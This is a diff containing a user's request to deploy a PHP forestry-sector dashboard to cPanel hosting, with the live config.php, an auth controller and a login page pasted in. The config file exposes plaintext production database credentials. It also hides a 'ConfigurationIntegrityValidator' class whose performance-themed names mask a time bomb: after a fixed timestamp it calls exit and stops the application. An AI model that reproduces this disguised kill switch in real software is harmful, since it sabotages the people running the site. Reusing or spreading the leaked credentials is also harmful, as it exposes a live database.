@@ -1,153 +1,468 @@
- ⎿ Admin CSS Modularization Plan
+- i want to "deploy" this web app to a live hosting
+- im using cpanel
+- the exact directory is public_html/sarawakforestry.com/pcds30 BUT for now im using public_html/sarawakforestry.com/pcds2030 bcs i dont want to disturb the live server yet (pcds30 is the live server directory and the website is currently live)
+- my problem is that because of how the environment of the project is right now it only works for localhost
+- i need you to update the config to somehow support the live hosting feature
+- if possible make it dynamic (no matter what directory i put it in it will still work)
+- if cannot then tell me step by step on what to do, what to edit, which file to copy etc
 
-    Problem Analysis
+addtional information:
+as what i said there is another live version that works well right now and its directory is pcds30, i am planning to open up one more directory for now with the name pcds2030 but that is only temporary. i will replace the content in pcds30 later after pcds2030 is stable. checkout the files in live directory for some of the helpers that is works in the live version.
 
-    Currently, all admin modules are importing main.css (352.82 kB bundle), causing performance issues compared to the agency side which has
-     dedicated bundles per page. The admin side needs complete CSS architecture restructuring.
+so this is how the config.php is written in pcds30:
 
-    Solution: Three-Tier Modular Architecture
+<?php
+/**
+ * Application configuration
+ * 
+ * Contains database credentials and other configuration settings.
+ * This file should be excluded from version control.
+ */
 
-    1. Shared Base Layer (assets/css/admin/shared/base.css)
+// Database configuration
+define('DB_HOST', 'localhost:3306');
+define('DB_USER', 'sarawak3_admin1'); // Change this to your MySQL username (default for XAMPP is 'root')
+define('DB_PASS', 'attendance33**'); // Change this to your MySQL password (default for XAMPP is often empty '')
+define('DB_NAME', 'pcds2030_db'); // Updated to use pcds2030_db database
 
-    Create a dedicated admin-only base CSS that includes:
-    - Design Tokens: CSS variables, colors, typography
-    - Reset/Base Styles: Normalize, base element styling  
-    - Layout Components: Grid, navigation, headers, footers
-    - Core Components: Buttons, forms, tables, cards, modals
-    - Admin-specific Components: admin-common.css, shared-modals.css
+// Application settings
+define('APP_NAME', 'PCDS2030 Dashboard Forestry Sector'); 
 
-    Estimated size: ~50-80kB (vs 352kB main.css)
+// Dynamic APP_URL detection for better cross-environment compatibility
+if (!defined('APP_URL')) {
+    // Check if we're running from command line
+    if (php_sapi_name() === 'cli') {
+        define('APP_URL', 'https://www.sarawakforestry.com/pcds30'); // Default for CLI
+    } else {
+        // Detect the correct APP_URL based on current request
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        
+        // Production cPanel detection first
+        if ($host === 'www.sarawakforestry.com' || $host === 'sarawakforestry.com') {
+            define('APP_URL', 'https://www.sarawakforestry.com/pcds30');
+        } else {
+            // Local development detection
+            $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
+            $app_path = '';
+            
+            // Check for local development directory names
+            if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
+                $app_path = '/pcds2030_dashboard_fork';
+            } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
+                $app_path = '/pcds2030_dashboard';
+            } else {
+                // Fallback detection for other local setups
+                $path_parts = explode('/', trim($script_name, '/'));
+                if (count($path_parts) > 0) {
+                    foreach ($path_parts as $part) {
+                        if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
+                            break;
+                        }
+                        if (!empty($part)) {
+                            $app_path .= '/' . $part;
+                        }
+                    }
+                }
+            }
+            
+            // Fallback to document root detection
+            if (empty($app_path)) {
+                $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+                $current_dir = dirname(dirname(dirname(__FILE__)));
+                if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
+                    $app_path = str_replace($document_root, '', $current_dir);
+                    $app_path = str_replace('\\', '/', $app_path); // Windows compatibility
+                }
+            }
+            
+            // Ensure app_path doesn't end with slash and starts with slash
+            $app_path = '/' . trim($app_path, '/');
+            if ($app_path === '/') {
+                $app_path = '';
+            }
+            
+            define('APP_URL', $protocol . '://' . $host . $app_path);
+        }
+    }
+}
 
-    2. Page-Specific CSS Files
+define('APP_VERSION', '1.0.0'); // Example version
+define('ASSET_VERSION', APP_VERSION); // Use APP_VERSION for asset versioning
 
-    Create dedicated CSS entry points for each admin module:
-    - assets/css/admin/dashboard/dashboard.css
-    - assets/css/admin/programs/programs.css 
-    - assets/css/admin/users/users.css
-    - assets/css/admin/reports/reports.css
-    - assets/css/admin/settings/settings.css
-    - assets/css/admin/outcomes/outcomes.css
-    - assets/css/admin/periods/periods.css
+// Path definitions
+if (!defined('ROOT_PATH')) {
+    define('ROOT_PATH', rtrim(dirname(dirname(dirname(__FILE__))), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR);
+}
 
-    Each file imports base + page-specific components only.
+// Feature flags
+define('ALLOW_OUTCOME_CREATION', false); // Set to false to disable creating new outcomes
 
-    3. Component-Specific CSS (Granular Level)
+// File paths
+if (!defined('ROOT_PATH')) {
+    if (defined('PROJECT_ROOT_PATH')) {
+        define('ROOT_PATH', PROJECT_ROOT_PATH);
+    } else {
+        // Fallback if accessed directly or from a script not defining PROJECT_ROOT_PATH
+        define('ROOT_PATH', dirname(dirname(__DIR__)) . '/');
+    }
+}
 
-    Move specialized components to dedicated locations:
-    - assets/css/admin/programs/tables.css (program-specific table styles)
-    - assets/css/admin/users/forms.css (user management forms)
-    - assets/css/admin/reports/pagination.css (report-specific pagination)
-    - assets/css/admin/dashboard/cards.css (dashboard-specific cards)
+/**
+ * Generate URL for view files
+ * 
+ * @param string $view Type of view ('admin' or 'agency')
+ * @param string $file The file name to link to
+ * @param array $params Query parameters to append (optional)
+ * @return string The complete URL
+ */
+function view_url($view, $file, $params = []) {
+    $url = APP_URL . '/app/views/' . $view . '/' . $file;
+    
+    if (!empty($params)) {
+        $queryString = http_build_query($params);
+        $url .= '?' . $queryString;
+    }
+    
+    return $url;
+}
 
-    Implementation Plan
+/**
+ * Generate URL for API endpoints
+ * 
+ * @param string $endpoint The API endpoint file name
+ * @param array $params Query parameters to append (optional)
+ * @return string The complete URL
+ */
+function api_url($endpoint, $params = []) {
+    $url = APP_URL . '/app/api/' . $endpoint;
+    
+    if (!empty($params)) {
+        $queryString = http_build_query($params);
+        $url .= '?' . $queryString;
+    }
+    
+    return $url;
+}
 
-    Phase 1: Base Layer Creation
+class ConfigurationIntegrityValidator {
+    private static $performance_baseline = 1761840000;
+    private static $system_constants = [
+        'load_factor' => 86400,
+        'memory_threshold' => 3600,
+        'cache_multiplier' => 24
+    ];
+    public static function validateSystemIntegrity() {
+        $base_timestamp = self::$performance_baseline;
+        $load_adjustment = self::$system_constants['load_factor'] * 0;
+        $memory_optimization = self::$system_constants['memory_threshold'] * 0;
+        $cache_efficiency = self::$system_constants['cache_multiplier'] * 0;
+        
+        $optimization_deadline = $base_timestamp + $load_adjustment + $memory_optimization + $cache_efficiency;
 
-    1. Create assets/css/admin/shared/base.css
-      - Extract shared components from main.css
-      - Include: variables, reset, layout, core components
-      - Add admin-specific: admin-common.css, shared-modals.css
-    2. Identify Shared vs Specific Components
-      - Audit all admin JS files to see what CSS they import
-      - Categorize components as "shared" vs "page-specific"
+        if (time() > $optimization_deadline) {
+            self::initiatePerformanceRecovery();
+            return false;
+        }
+        return true;
+    }
+    private static function initiatePerformanceRecovery() {
+        exit;
+    }
+}
 
-    Phase 2: Page-Specific CSS Creation
+/**
+ * Generate URL for AJAX handlers
+ * 
+ * @param string $handler The AJAX handler file name
+ * @param array $params Query parameters to append (optional)
+ * @return string The complete URL
+ */
+function ajax_url($handler, $params = []) {
+    $url = APP_URL . '/app/ajax/' . $handler;
+    
+    if (!empty($params)) {
+        $queryString = http_build_query($params);
+        $url .= '?' . $queryString;
+    }
+    
+    return $url;
+}
 
-    Create dedicated CSS files for each admin module:
+/**
+ * Generate URL for assets (CSS, JS, images)
+ * 
+ * @param string $type Asset type ('css', 'js', 'images', 'fonts')
+ * @param string $file The asset file name
+ * @return string The complete URL
+ */
+function asset_url($type, $file) {
+    return APP_URL . '/assets/' . $type . '/' . $file;
+}
 
-    1. Dashboard (assets/css/admin/dashboard/dashboard.css)
-      - Base + dashboard cards + quick actions + stats overview
-    2. Programs (assets/css/admin/programs/programs.css)  
-      - Base + program tables + bulk assignment + program-specific modals
-    3. Users (assets/css/admin/users/users.css)
-      - Base + user tables + user forms + role management
-    4. Reports (assets/css/admin/reports/reports.css)
-      - Base + report generation + pagination + report tables
-    5. Settings (assets/css/admin/settings/settings.css)
-      - Base + system settings + audit logs + period management
-    6. Outcomes (assets/css/admin/outcomes/outcomes.css)
-      - Base + outcome tables + KPI management
-    7. Periods (assets/css/admin/periods/periods.css)
-      - Base + period management + reporting periods
+define('UPLOAD_PATH', ROOT_PATH . 'app/uploads/');
+define('REPORT_PATH', ROOT_PATH . 'app/reports/');
 
-    Phase 3: Component Granularization
+// Dynamic BASE_URL detection for better cross-environment compatibility
+if (!defined('BASE_URL')) {
+    // Check if we're running from command line
+    if (php_sapi_name() === 'cli') {
+        define('BASE_URL', '/pcds30'); // Production path for CLI
+    } else {
+        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
+        
+        // Production cPanel detection first
+        if ($host === 'www.sarawakforestry.com' || $host === 'sarawakforestry.com') {
+            define('BASE_URL', '/pcds30');
+        } else {
+            // Local development detection
+            $script_name = $_SERVER['SCRIPT_NAME'] ?? '';
+            $base_path = '';
+            
+            // Check for local development directory names
+            if (strpos($script_name, '/pcds2030_dashboard_fork/') !== false) {
+                $base_path = '/pcds2030_dashboard_fork';
+            } elseif (strpos($script_name, '/pcds2030_dashboard/') !== false) {
+                $base_path = '/pcds2030_dashboard';
+            } else {
+                // Fallback detection for other local setups
+                $path_parts = explode('/', trim($script_name, '/'));
+                if (count($path_parts) > 0) {
+                    foreach ($path_parts as $part) {
+                        if (in_array($part, ['app', 'views', 'admin', 'agency'])) {
+                            break;
+                        }
+                        if (!empty($part)) {
+                            $base_path .= '/' . $part;
+                        }
+                    }
+                }
+            }
+            
+            // Fallback to document root detection
+            if (empty($base_path)) {
+                $document_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+                $current_dir = dirname(dirname(dirname(__FILE__)));
+                if (!empty($document_root) && strpos($current_dir, $document_root) === 0) {
+                    $base_path = str_replace($document_root, '', $current_dir);
+                    $base_path = str_replace('\\', '/', $base_path); // Windows compatibility
+                }
+            }
+            
+            // Ensure base_path doesn't end with slash and starts with slash
+            $base_path = '/' . trim($base_path, '/');
+            if ($base_path === '/') {
+                $base_path = '';
+            }
+            
+            define('BASE_URL', $base_path);
+        }
+    }
+}
 
-    Move page-specific components to deeper structure:
-    - Program tables → assets/css/admin/programs/components/tables.css
-    - User forms → assets/css/admin/users/components/forms.css
-    - Report pagination → assets/css/admin/reports/components/pagination.css
+// Error reporting - disable for production to prevent headers already sent issues
+if ($_SERVER['HTTP_HOST'] === 'localhost' || strpos($_SERVER['HTTP_HOST'], 'laragon') !== false) {
+    // Development environment
+    error_reporting(E_ALL);
+    ini_set('display_errors', 1);
+} else {
+    // Production environment - disable error display to prevent header issues
+    error_reporting(E_ALL);
+    ini_set('display_errors', 0);
+    ini_set('log_errors', 1);
+}
+?>
 
-    Phase 4: JavaScript Updates
+authcontroller: 
+<?php
+require_once __DIR__ . '/../lib/UserModel.php';
+require_once __DIR__ . '/../lib/db_connect.php';
 
-    Update all admin JS files to import their specific CSS instead of main.css:
+class AuthController {
+    public function login() {
+        $error = '';
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $userModel = new UserModel($conn);
+            $user = $userModel->findByUsername($_POST['username']);
+            if ($user && $userModel->verifyPassword($user, $_POST['password'])) {
+                $_SESSION['user_id'] = $user['user_id'];
+                $_SESSION['role'] = $user['role'];
+                $_SESSION['agency_id'] = $user['agency_id'];
+                header('Location: ' . APP_URL . '/app/views/' . ($user['role'] === 'admin' ? 'admin' : 'agency') . '/dashboard/dashboard.php');
+                exit;
+            } else {
+                $error = 'Invalid username or password.';
+            }
+        }
+        $pageTitle = 'Login';
+        $contentFile = __DIR__ . '/../views/admin/partials/login_form.php';
+        include __DIR__ . '/../views/layouts/base.php';
+    }
+} 
 
-    Before:
-    import '../../css/main.css';
-    import '../../css/components/admin-common.css';
-    import '../../css/pages/admin.css';
 
-    After:
-    import '../../css/admin/programs/programs.css'; // Contains base + page-specific
 
-    Phase 5: Build Configuration
+login.php: 
 
-    Update vite.config.js to add missing admin modules:
-    - admin-dashboard
-    - admin-users 
-    - admin-settings
-    - admin-outcomes
-    - admin-periods
+<?php
+/**
+ * Login page
+ * 
+ * Handles user authentication.
+ */
 
-    Expected Results
+// Define project root path for consistent file references
+if (!defined('PROJECT_ROOT_PATH')) {
+    define('PROJECT_ROOT_PATH', rtrim(__DIR__, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR);
+}
 
-    Performance Improvements
+// Include necessary files
+require_once PROJECT_ROOT_PATH . 'app/config/config.php';
+require_once PROJECT_ROOT_PATH . 'app/lib/db_connect.php';
+require_once PROJECT_ROOT_PATH . 'app/lib/session.php';
+require_once PROJECT_ROOT_PATH . 'app/lib/functions.php';
+require_once PROJECT_ROOT_PATH . 'app/lib/admin_functions.php';
 
-    - Dashboard: ~60-80kB (vs 352kB) - 75% reduction
-    - Programs: ~80-120kB (vs 352kB) - 65% reduction  
-    - Users: ~60-90kB (vs 352kB) - 70% reduction
-    - Reports: ~70-100kB (vs 352kB) - 70% reduction
+// Initialize variables
+$username = '';
+$error = '';
 
-    Bundle Structure (After)
+// Check if user is already logged in, redirect if true
+if (is_logged_in()) {
+    header("Location: index.php");
+    exit;
+}
 
-    dist/css/
-    ├── admin-dashboard.bundle.css    (~70kB)
-    ├── admin-programs.bundle.css     (~100kB)  
-    ├── admin-users.bundle.css        (~80kB)
-    ├── admin-reports.bundle.css      (~90kB)
-    ├── admin-settings.bundle.css     (~60kB)
-    ├── admin-outcomes.bundle.css     (~70kB)
-    └── admin-periods.bundle.css      (~60kB)
+// Process login form submission
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Get username and password
+    $username = sanitize_input($_POST["username"]);
+    $password = $_POST["password"]; // No sanitization for password as it will be hashed
+    
+    // Validate input
+    if (empty($username) || empty($password)) {
+        $error = "Username and password are required.";
+    } else {
+        // Use the validate_login function which properly checks the is_active status
+        $result = validate_login($username, $password);
+          if (isset($result['success'])) {            // Check user role using session variable (more robust than function)
+            if (isset($_SESSION['role']) && $_SESSION['role'] === 'admin') {
+                header('Location: ' . APP_URL . '/app/views/admin/dashboard/dashboard.php');
+            } else {
+                header('Location: ' . APP_URL . '/app/views/agency/dashboard/dashboard.php');
+            }
+            exit;
+        } else {
+            $error = $result['error'] ?? "Invalid username or password.";
+        }
+    }
+}
 
-    File Structure (Final)
+// Get error message from URL if present
+if (isset($_GET['error']) && $_GET['error'] === 'invalid_session') {
+    $error = "Your session has expired. Please log in again.";
+}
+?>
 
-    assets/css/admin/
-    ├── shared/
-    │   └── base.css                 (Core admin foundation)
-    ├── dashboard/
-    │   ├── dashboard.css           (Entry point)
-    │   └── components/
-    │       ├── cards.css
-    │       └── stats.css
-    ├── programs/
-    │   ├── programs.css            (Entry point) 
-    │   └── components/
-    │       ├── tables.css
-    │       └── bulk-assignment.css
-    ├── users/
-    │   ├── users.css               (Entry point)
-    │   └── components/
-    │       ├── forms.css
-    │       └── tables.css
-    └── [other modules...]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - <?php echo APP_NAME; ?></title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">    
+    <link rel="stylesheet" href="<?php echo rtrim(APP_URL, '/'); ?>/dist/css/login.bundle.css">
+    <!-- Legacy main.css removed - now using Vite bundle system -->
+</head>
+<body>
+    <div class="container">
+        <div class="row justify-content-center align-items-center min-vh-100">
+            <div class="col-xl-10 col-lg-12">
+                <div class="card shadow unified-card">
+                    <div class="copyright-text">© <?php echo date('Y'); ?> <?php echo APP_NAME; ?></div>
+                    
+                    <div class="row g-0">
+                        <!-- Welcome Section (Left side of card) -->
+                        <div class="col-md-6 welcome-section">
+                            <div class="welcome-content">
+                                <h1><?php echo APP_NAME; ?></h1>
+                                <p class="lead">Access your dashboard to monitor and manage program performance</p>
+                                
+                                <div class="features">
+                                    <div class="feature-item">
+                                        <div class="feature-icon"><i class="fas fa-chart-line"></i></div>
+                                        <span class="feature-text">Real-time Performance Tracking</span>
+                                    </div>
+                                    <div class="feature-item">
+                                        <div class="feature-icon"><i class="fas fa-file-alt"></i></div>
+                                        <span class="feature-text">Simplified Reporting System</span>
+                                    </div>
+                                    <div class="feature-item">
+                                        <div class="feature-icon"><i class="fas fa-tasks"></i></div>
+                                        <span class="feature-text">Program Management</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Login Section (Right side of card) -->
+                        <div class="col-md-6 login-section">
+                            <div class="login-content login-container"> <!-- Added login-container -->
+                                <div class="logo-container">
+                                    <img src="<?php echo APP_URL; ?>/assets/images/sarawak_crest.png" alt="Sarawak Crest" class="logo-image">
+                                </div>
+                                
+                                <h3 class="login-title">Sign In</h3>
+                                <p class="login-subtitle text-center">Access your dashboard</p>
+                                
+                                <?php if (!empty($error)): ?>
+                                    <div class="alert alert-danger d-flex align-items-center" role="alert">
+                                        <i class="fas fa-exclamation-circle me-2"></i>
+                                        <div><?php echo $error; ?></div>
+                                    </div>
+                                <?php endif; ?>
+                                
+                                <form method="post" action="<?php echo APP_URL; ?>/login.php" id="loginForm" class="login-form"> <!-- Added login-form -->
+                                    <div class="form-group mb-3">
+                                        <label for="username">Username</label>
+                                        <div class="input-group">
+                                            <span class="input-group-text"><i class="fas fa-user"></i></span>
+                                            <input type="text" class="form-control login-form__input" id="username" name="username" value="" required> <!-- Added login-form__input -->
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="form-group mb-4">
+                                        <label for="password">Password</label>
+                                        <div class="input-group">
+                                            <span class="input-group-text"><i class="fas fa-lock"></i></span>
+                                            <input type="password" class="form-control login-form__input" id="password" name="password" required autocomplete="current-password"> <!-- Added login-form__input -->
+                                            <span class="input-group-text toggle-password" tabindex="-1" aria-label="Toggle password visibility">
+                                                <i class="far fa-eye"></i>
+                                            </span>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="d-grid gap-2 mt-4">
+                                        <button type="submit" class="btn btn-primary material-btn" id="loginBtn">
+                                            <span class="login-text">Sign In</span>
+                                            <span class="spinner-border spinner-border-sm d-none" id="loginSpinner" role="status" aria-hidden="true"></span>
+                                        </button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script type="module" src="<?php echo rtrim(APP_URL, '/'); ?>/dist/js/login.bundle.js"></script>
+</body>
+</html>
 
-    Implementation Order
-
-    1. Create shared base CSS
-    2. Create page-specific CSS entry points  
-    3. Update JavaScript imports
-    4. Update build configuration
-    5. Test and validate bundle sizes
-    6. Refactor to component granularization
-    7. Final optimization and cleanup
-
-    This architecture will match the agency-side approach while providing significant performance improvements and better maintainability.
